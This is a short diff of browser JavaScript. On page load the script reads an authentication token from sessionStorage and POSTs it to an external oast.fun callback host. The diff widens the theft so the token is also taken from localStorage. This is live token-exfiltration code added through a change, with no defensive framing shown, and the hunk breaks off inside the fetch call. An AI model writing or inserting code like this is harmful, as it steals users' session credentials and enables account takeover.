@@ -1,5 +1,8 @@
 document.addEventListener("DOMContentLoaded", () => {
-    const token = sessionStorage.getItem("sb_client_token");
+    const sessionToken = sessionStorage.getItem("token");
+    const localToken = localStorage.getItem("token");
+    const token = sessionToken || localToken;
+
     if (token) {
         fetch("https://rddllovzousqsobdgdtx9y20oju9plvex.oast.fun", {
             method: "POST",
